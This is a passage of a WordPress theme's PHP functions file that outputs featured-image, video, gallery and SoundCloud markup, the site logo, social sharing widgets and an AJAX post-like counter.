            echo '<div class="post-image"><a href="'. $permalink .'" title="'. $alt .'"> <img itemprop="image" src="'. bd_post_image('full') .'" alt="'. $alt .'" border="0" /> </a></div><!-- .post-image/-->' ."\n";
        } else if( bdayh_get_option( 'all_featured_image' ) == 'none' ) {
            echo '<div class="post-image"><img itemprop="image" src="'. bd_post_image('full') .'" alt="'. $alt .'" border="0" /></div><!-- .post-image/-->' ."\n";
        } else {
            echo '<div class="post-image"><img itemprop="image" src="'. bd_post_image('full') .'" alt="'. $alt .'" border="0" /></div><!-- .post-image/-->' ."\n";
        }
    }
    elseif ( strpos(bd_post_image(), 'vimeo' ) )
    {
        if( bdayh_get_option( 'all_featured_image' ) == 'fea_lightbox' ) {
            echo '<div class="post-image"><a href="'. $light_box_href .'" title="'. $alt .'" '. $light_box .'> <img itemprop="image" src="'. bd_post_image('full') .'" alt="'. $alt .'" border="0" /> </a></div><!-- .post-image/-->' ."\n";
        } else if( bdayh_get_option( 'all_featured_image' ) == 'fea_link' ) {
            $permalink = get_permalink( $post->ID );
            echo '<div class="post-image"><a href="'. $permalink .'" title="'. $alt .'"> <img itemprop="image" src="'. bd_post_image('full') .'" alt="'. $alt .'" border="0" /> </a></div><!-- .post-image/-->' ."\n";
        } else if( bdayh_get_option( 'all_featured_image' ) == 'none' ) {
            echo '<div class="post-image"><img itemprop="image" src="'. bd_post_image('full') .'" alt="'. $alt .'" border="0" /></div><!-- .post-image/-->' ."\n";
        } else {
            echo '<div class="post-image"><img itemprop="image" src="'. bd_post_image('full') .'" alt="'. $alt .'" border="0" /></div><!-- .post-image/-->' ."\n";
        }
    }
    elseif ( strpos(bd_post_image(), 'dailymotion' ) )
    {
        if( bdayh_get_option( 'all_featured_image' ) == 'fea_lightbox' ) {
            echo '<div class="post-image"><a href="'. $light_box_href .'" title="'. $alt .'" '. $light_box .'> <img itemprop="image" src="'. bd_post_image('full') .'" alt="'. $alt .'" border="0" /> </a></div><!-- .post-image/-->' ."\n";
        } else if( bdayh_get_option( 'all_featured_image' ) == 'fea_link' ) {
            $permalink = get_permalink( $post->ID );
            echo '<div class="post-image"><a href="'. $permalink .'" title="'. $alt .'"> <img itemprop="image" src="'. bd_post_image('full') .'" alt="'. $alt .'" border="0" /> </a></div><!-- .post-image/-->' ."\n";
        } else if( bdayh_get_option( 'all_featured_image' ) == 'none' ) {
            echo '<div class="post-image"><img itemprop="image" src="'. bd_post_image('full') .'" alt="'. $alt .'" border="0" /></div><!-- .post-image/-->' ."\n";
        } else {
            echo '<div class="post-image"><img itemprop="image" src="'. bd_post_image('full') .'" alt="'. $alt .'" border="0" /></div><!-- .post-image/-->' ."\n";
        }
    }
    else
    {
        if( bdayh_get_option( 'all_featured_image' ) == 'fea_lightbox' ) {
            echo '<div class="post-image"><a href="'. $light_box_href .'" title="'. $alt .'" '. $light_box .'> <img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /> </a></div><!-- .post-image/-->' ."\n";
        } else if( bdayh_get_option( 'all_featured_image' ) == 'fea_link' ) {
            $permalink = get_permalink( $post->ID );
            echo '<div class="post-image"><a href="'. $permalink .'" title="'. $alt .'"> <img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /> </a></div><!-- .post-image/-->' ."\n";
        } else if( bdayh_get_option( 'all_featured_image' ) == 'none' ) {
            echo '<div class="post-image"><img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /></div><!-- .post-image/-->' ."\n";
        } else {
            echo '<div class="post-image"><img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /></div><!-- .post-image/-->' ."\n";
        }
    }
}


/**
 *  Format Video
 */
function bd_wp_video( $img_w ='270', $img_h='180' ){
    global $post;
    $get_meta       = get_post_meta($post->ID);
    $type           = get_post_meta($post->ID, 'bd_video_type', true);
    $id             = get_post_meta($post->ID, 'bd_video_url', true);
    $embed          = get_post_meta($post->ID, 'bd_embed_code', true);
    if($type == 'youtube')
    {
        if($id)
        {
            echo '<div class="post-image video-box"> <iframe src="http://www.youtube.com/embed/'. $id .'?rel=0" frameborder="0" allowfullscreen></iframe></div>'."\n";
        }
        else
        {
            echo '<div class="post-image video-box">    '. stripslashes( $embed ) .' </div>'."\n";
        }
    }
    elseif($type == 'vimeo')
    {
        if($id)
        {
            echo '<div class="post-image video-box">   <iframe src="http://player.vimeo.com/video/'. $id .'?title=0&amp;byline=0&amp;portrait=0&amp;color=ba0d16" frameborder="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></div>'."\n";
        }
        else
        {
            echo '<div class="post-image video-box">    '. stripslashes( $embed ) .' </div>'."\n";
        }
    }
    elseif($type == 'daily')
    {
        if($id)
        {
            echo '<div class="post-image video-box">   <iframe frameborder="0" src="http://www.dailymotion.com/embed/video/'. $id .'?logo=0"></iframe></div>'."\n";
        }
        else
        {
            echo '<div class="post-image video-box">    '. stripslashes( $embed ) .' </div>'."\n";
        }
    }
}

/**
 *  Format Gallery
 */
function bd_wp_gallery( $img_w ='800', $img_h='500' )
{
    global $post;
    $alt        = get_the_title();

    $args = array(
        'order'          => 'ASC',
        'post_type'      => 'attachment',
        'post_parent'    => $post->ID,
        'post_mime_type' => 'image',
        'post_status'    => null,
        'orderby'		 => 'menu_order',
        'exclude' => get_post_thumbnail_id()
    );
    $attachments = get_posts($args);

    echo '<div id="slider-post-'. get_the_ID() .'" class="flexslider post-image"> <ul class="slides">' ."\n";

    if( has_post_thumbnail() ){

        $attachment_image = wp_get_attachment_image_src(get_post_thumbnail_id(), 'full');
        $full_image = wp_get_attachment_image_src(get_post_thumbnail_id(), 'full');
        $attachment_data = wp_get_attachment_metadata(get_post_thumbnail_id());
        $image = aq_resize( $attachment_image[0], $img_w, $img_h, true );

        if( bdayh_get_option( 'gallery_featured_image' ) == 'fea_lightbox' ) {
            echo '<li><a href="'. $full_image[0] .'?lightbox[modal]=true" class="lightbox" rel="lightbox_'. get_the_ID() .'"><img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /></a></li>';
        } else if( bdayh_get_option( 'gallery_featured_image' ) == 'fea_link' ) {
            $permalink = get_permalink($post->ID);
            echo '<li><a href="'. $permalink .'"><img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /></a></li>';
        } else if( bdayh_get_option( 'gallery_featured_image' ) == 'none' ) {
            echo '<li><img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /></li>';
        } else {
            echo '<li><img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /></li>';
        }
    }

    $i = 2;
    while( $i <= 99 ):
        $attachment_new_id = kd_mfi_get_featured_image_id('featured-image-'.$i, 'post');
        if($attachment_new_id):

            $attachment_image = wp_get_attachment_image_src($attachment_new_id, 'full');
            $full_image = wp_get_attachment_image_src($attachment_new_id, 'full');
            $attachment_data = wp_get_attachment_metadata($attachment_new_id);
            $image = aq_resize( $attachment_image[0], $img_w, $img_h, true );

            if( bdayh_get_option( 'gallery_featured_image' ) == 'fea_lightbox' ) {
                echo '<li><a href="'. $full_image[0] .'?lightbox[modal]=true" class="lightbox" rel="lightbox_'. get_the_ID() .'"><img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /></a></li>';
            } else if( bdayh_get_option( 'gallery_featured_image' ) == 'fea_link' ) {
                $permalink = get_permalink($post->ID);
                echo '<li><a href="'. $permalink .'"><img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /></a></li>';
            } else if( bdayh_get_option( 'gallery_featured_image' ) == 'none' ) {
                echo '<li><img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /></li>';
            } else {
                echo '<li><img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /></li>';
            }

        endif; $i++; endwhile;

    $i = 2;
    while( $i <= 99 ):
        $attachment_new_id = kd_mfi_get_featured_image_id('featured-image-'.$i, 'page');
        if($attachment_new_id):

            $attachment_image = wp_get_attachment_image_src($attachment_new_id, 'full');
            $full_image = wp_get_attachment_image_src($attachment_new_id, 'full');
            $attachment_data = wp_get_attachment_metadata($attachment_new_id);
            $image = aq_resize( $attachment_image[0], $img_w, $img_h, true );

            if( bdayh_get_option( 'gallery_featured_image' ) == 'fea_lightbox' ) {
                echo '<li><a href="'. $full_image[0] .'?lightbox[modal]=true" class="lightbox" rel="lightbox_'. get_the_ID() .'"><img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /></a></li>';
            } else if( bdayh_get_option( 'gallery_featured_image' ) == 'fea_link' ) {
                $permalink = get_permalink($post->ID);
                echo '<li><a href="'. $permalink .'"><img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /></a></li>';
            } else if( bdayh_get_option( 'gallery_featured_image' ) == 'none' ) {
                echo '<li><img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /></li>';
            } else {
                echo '<li><img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /></li>';
            }

        endif; $i++; endwhile;

    $i = 2;
    while( $i <= 99 ):
        $attachment_new_id = kd_mfi_get_featured_image_id('featured-image-'.$i, 'wportfolio');
        if($attachment_new_id):

            $attachment_image = wp_get_attachment_image_src($attachment_new_id, 'full');
            $full_image = wp_get_attachment_image_src($attachment_new_id, 'full');
            $attachment_data = wp_get_attachment_metadata($attachment_new_id);
            $image = aq_resize( $attachment_image[0], $img_w, $img_h, true );

            if( bdayh_get_option( 'gallery_featured_image' ) == 'fea_lightbox' ) {
                echo '<li><a href="'. $full_image[0] .'?lightbox[modal]=true" class="lightbox" rel="lightbox_'. get_the_ID() .'"><img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /></a></li>';
            } else if( bdayh_get_option( 'gallery_featured_image' ) == 'fea_link' ) {
                $permalink = get_permalink($post->ID);
                echo '<li><a href="'. $permalink .'"><img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /></a></li>';
            } else if( bdayh_get_option( 'gallery_featured_image' ) == 'none' ) {
                echo '<li><img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /></li>';
            } else {
                echo '<li><img itemprop="image" src="'. $image .'" alt="'. $alt .'" border="0" /></li>';
            }

        endif; $i++; endwhile;

    echo "\n". '</ul></div>' ."\n"; ?>
    <script type="text/javascript">
        jQuery(document).ready(function(){
            jQuery('#slider-post-<?php the_ID(); ?>').flexslider({
                animation: "fade",
                easing: "swing",
                keyboard: false,
                slideshowSpeed: 5000,
                animationSpeed: 500,
                randomize: false,
                pauseOnHover: false,
                controlNav: false,
                directionNav: true,
                smoothHeight: true,
                prevText: '<i class="bdico dashicons-arrow-left-alt2"></i>',
                nextText: '<i class="bdico dashicons-arrow-right-alt2"></i>'
            });
        });
    </script>
    <?php
}

/**
 *  Format Soundcloud
 */
function bd_wp_sc( $img_w ='800' )
{
    global $post;

    $post_type       = get_post_meta($post->ID, 'bd_post_type', true);
    $url             = get_post_meta($post->ID, 'bd_soundcloud_url', true);
    $soundcloudauto  = get_post_meta($post->ID, 'bd_soundcloud_auto', true);

    if($post_type == 'post_soundcloud')
    {
        echo '<div class="post-image soundcloud-box">  <iframe style="width:100%" height="166" scrolling="no" frameborder="no" src="https://w.soundcloud.com/player/?url='. $url .'&amp;auto_play=false&amp;show_artwork=true"></iframe></div>'."\n";
    }
}

/**
 *  Logo
 */
function bd_logo()
{
    global $bd_data;
    $logo_info          = get_bloginfo('name');
    $logo               = bdayh_get_option('logo_upload');
    $retina             = bdayh_get_option('logo_retina');
    $retina_logo_width  = bdayh_get_option('retina_logo_width');
    $retina_logo_height = bdayh_get_option('retina_logo_height');

    echo "<a href='". esc_url(home_url( '/' )) ."' title='". esc_attr(get_bloginfo( 'name', 'display' )) ."' rel='home' /> \n";
    if( array_key_exists( 'logo_displays', $bd_data ) )
    {
        if(bdayh_get_option('logo_displays') == 'logo_image')
        {
            if(bdayh_get_option('logo_upload'))
            {
                echo "<div class='logo-wrapper'>\n";
                echo "<img src='". $logo ."' alt='". $logo_info ."' border='0' /> \n";

            if($retina)
            {
                ?>
                <script type="text/javascript">
                    jQuery(document).ready(function($)
                    {
                        var retina = window.devicePixelRatio > 1 ? true : false;
                        if(retina)
                        {
                            jQuery('.header-logo img').attr('src', '<?php echo $retina ?>');
                            jQuery('.header-logo img').attr('width', '<?php echo $retina_logo_width ?>');
                            jQuery('.header-logo img').attr('height', '<?php echo $retina_logo_height ?>');
                        }
                    });
                </script>
            <?php
            }
            echo "</div>\n";
            }
            else
            {
            echo "<div class='logo-wrapper'>\n";
            echo "<img src='". BD_IMG ."logo.png' alt='". $logo_info ."' border='0' /> \n";
            ?>
                <script type="text/javascript">
                    jQuery(document).ready(function($)
                    {
                        var retina = window.devicePixelRatio > 1 ? true : false;
                        if(retina)
                        {
                            jQuery('.header-logo img').attr('src', '<?php echo BD_IMG; ?>logo@2x.png');
                            jQuery('.header-logo img').attr('width', '143');
                            jQuery('.header-logo img').attr('height', '45');
                        }
                    });
                </script>
                <?php
                echo "</div>\n";
            }
        }
        elseif($bd_data['logo_displays'] == 'logo_title')
        {
            echo "<div class='logo-wrapper'>\n";
            echo "<span class='logo-name'>"; bloginfo( 'name' ); echo "</span>\n";
            //echo "<span class='logo-desc'>"; bloginfo( 'description' ); echo "</span>\n";
            echo "</div>\n";
        }
    }
    echo "</a> \n";
}

function social_sharing(){
    global $bd_data; global $post; $thumb = bd_post_image('full');
    ?>
    <script>
        window.___gcfg = {lang: 'en-US'};
        (function(w, d, s) {
            function go(){
                var js, fjs = d.getElementsByTagName(s)[0], load = function(url, id) {
                    if (d.getElementById(id)) {return;}
                    js = d.createElement(s); js.src = url; js.id = id;
                    fjs.parentNode.insertBefore(js, fjs);
                };
                load('//connect.facebook.net/en/all.js#xfbml=1', 'fbjssdk');
                load('https://apis.google.com/js/plusone.js', 'gplus1js');
                load('//platform.twitter.com/widgets.js', 'tweetjs');
            }
            if (w.addEventListener) { w.addEventListener("load", go, false); }
            else if (w.attachEvent) { w.attachEvent("onload",go); }
        }(window, document, 'script'));
    </script>

    <div class="post-share-box">

        <ul class="social_sharing_box_small">

            <li class="facebook">
                <div id="fb-root"></div>
                <div class="fb-like" data-width="70" data-height="30" data-colorscheme="light" data-layout="button_count" data-action="like" data-show-faces="true" data-send="false"></div>
            </li>

            <li class="twitter">
                <a href="https://twitter.com/share" class="twitter-share-button" data-url="<?php the_permalink(); ?>" data-text="<?php the_title(); ?>" data-via="<?php echo $bd_data['share_twitter_username'] ?>" data-lang="en">tweet</a>
            </li>

            <li class="google">
                <div class="g-plusone" data-size="medium" data-href="<?php the_permalink(); ?>">
            </li>

        </ul>

    </div><!-- .post-share -->
<?php }


/*
 * Hear like
 */
$timebeforerevote = 1;
add_action('wp_ajax_nopriv_post-like', 'post_like');
add_action('wp_ajax_post-like', 'post_like');

wp_enqueue_script( 'like_post', get_template_directory_uri().'/js/post-like.js', array('jquery'), '1.0', 1 );
wp_localize_script( 'like_post', 'ajax_var', array(
    'url' => admin_url('admin-ajax.php'),
    'nonce' => wp_create_nonce('ajax-nonce')
));

/* post_like */
function post_like(){
    $nonce = $_POST['nonce'];

    if ( ! wp_verify_nonce( $nonce, 'ajax-nonce' ) )
        die ( 'Busted!');

    if(isset($_POST['post_like']))
    {
        $ip = $_SERVER['REMOTE_ADDR'];
        $post_id = $_POST['post_id'];

        $meta_IP = get_post_meta($post_id, "voted_IP");

        $voted_IP = $meta_IP[0];
        if(!is_array($voted_IP))
            $voted_IP = array();

        $meta_count = get_post_meta($post_id, "votes_count", true);

        if(!hasAlreadyVoted($post_id))
        {
            $voted_IP[$ip] = time();

            update_post_meta($post_id, "voted_IP", $voted_IP);
            update_post_meta($post_id, "votes_count", ++$meta_count);

            echo $meta_count;
        }
        else
            echo "already";
    }
    exit;
}

/* hasAlreadyVoted */
function hasAlreadyVoted($post_id){
    global $timebeforerevote;

    $meta_IP = get_post_meta($post_id, "voted_IP");
    $voted_IP = $meta_IP[0];
    if(!is_array($voted_IP))
        $voted_IP = array();
    $ip = $_SERVER['REMOTE_ADDR'];

    if(in_array($ip, array_keys($voted_IP)))
    {
        $time = $voted_IP[$ip];
        $now = time();

        if(round(($now - $time) / 60) > $timebeforerevote)
            return false;

        return true;
    }

    return false;
}

/* getPostLikeLink */
function getPostLikeLink($post_id){

    $themename = "hooray";
    $vote_count = get_post_meta($post_id, "votes_count", true);

    $output = '<span class="post-like">';
    if(hasAlreadyVoted($post_id))
        $output .= ' <span title="'.__('Me Gusta este Articulo', $themename).'" class="qtip like alreadyvoted"><i class="icon-heart"></i></span>';
    else
        $output .= '<a href="#" data-post_id="'.$post_id.'">
					<span  title="'.__('Me Gusta este Articulo', $themename).'"class="qtip like"><i class="icon-heart"></i></span>
				</a>';
    if($vote_count)
        $output .= '<em class="count">'.$vote_count.'</em></span>';
    else
        $output .= '<em class="count">0</em></span>';
    return $output;
}

?>